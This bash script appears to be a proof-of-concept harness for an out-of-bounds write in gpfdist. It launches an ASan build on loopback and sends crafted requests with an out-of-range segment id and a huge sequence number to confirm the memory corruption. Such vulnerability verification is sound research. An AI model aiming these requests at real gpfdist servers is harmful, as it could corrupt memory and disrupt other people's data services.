#!/usr/bin/env bash
# Live loopback OPEN_SEQ -> DATA oracle for the real pinned gpfdist.c.
# If the OOB store at gpfdist.c:3677 writes seq=1 into seq_segs[3], a later
# DATA request with seq=2 passes the equality check at :3502 and returns 200.
# Without that store, seq_segs[3] holds pstrdup'd path bytes and it returns 400.
set -u
HERE=$(cd "$(dirname "$0")" && pwd)
BIN=${1:-$HERE/gpfdist_v761_asan}
PORT=${2:-18089}
TAG=$(basename "$BIN")_session
OUT="$HERE/out_$TAG"; rm -rf "$OUT"; mkdir -p "$OUT/data"
printf 'row1\nrow2\n' > "$OUT/data/data.txt"
: > "$OUT/data/out.txt"
LOG="$OUT/server.log"; : > "$LOG"
ASAN="$OUT/asan"; export ASAN_OPTIONS="abort_on_error=1:detect_leaks=0:log_path=$ASAN"
"$BIN" -b 127.0.0.1 -p "$PORT" -d "$OUT/data" -l "$LOG" >"$OUT/stdout.log" 2>&1 &
PID=$!
for i in $(seq 1 50); do
  (echo >"/dev/tcp/127.0.0.1/$PORT") >/dev/null 2>&1 && break
  sleep 0.1
done
if ! kill -0 "$PID" 2>/dev/null; then echo "SERVER_FAILED_TO_START"; sed -n 1,30p "$OUT/stdout.log"; exit 2; fi
echo "SERVER_PID=$PID PORT=$PORT BIN=$BIN"
S="http://127.0.0.1:$PORT/out.txt"
H=(-H 'X-GP-PROTO:1' -H 'X-GP-XID:42' -H 'X-GP-CID:1' -H 'X-GP-SN:1' \
   -H 'X-GP-SEGMENT-COUNT:1' -H 'X-GP-SEGMENT-ID:3')
req() {
  local d="$1"; shift
  local c
  c=$(curl -sS -m 5 -o "$OUT/$d.body" -w '%{http_code}' -X POST "$S" "${H[@]}" "$@" 2>"$OUT/$d.err")
  echo "$d http=$c rc=$?"
}
req open_1   -H 'X-GP-SEQ:1'
req data_2   -H 'X-GP-SEQ:2'
req done_3   -H 'X-GP-SEQ:3' -H 'X-GP-DONE:1'
# A second hostile session with a fresh XID to show repeatability.
H2=(-H 'X-GP-PROTO:1' -H 'X-GP-XID:43' -H 'X-GP-CID:1' -H 'X-GP-SN:1' \
    -H 'X-GP-SEGMENT-COUNT:1' -H 'X-GP-SEGMENT-ID:3')
c=$(curl -sS -m 5 -o "$OUT/probe.body" -w '%{http_code}' -X POST "$S" "${H2[@]}" \
     -H 'X-GP-SEGMENT-ID:3' -H 'X-GP-SEQ:4702111234474983745' 2>"$OUT/probe.err")
echo "huge_seq_probe http=$c rc=$?"
kill "$PID" 2>/dev/null; wait "$PID" 2>/dev/null
echo '--- interesting server lines ---'
grep -E 'out of order|missing sequence|new session|joined session|OPEN|seq|HTTP ERROR' "$LOG" | sed -n 1,60p
echo '--- asan ---'; ls "$OUT"/asan* 2>/dev/null | sed -n 1,10p
for f in "$OUT"/asan*; do [ -f "$f" ] && sed -n 1,40p "$f"; done
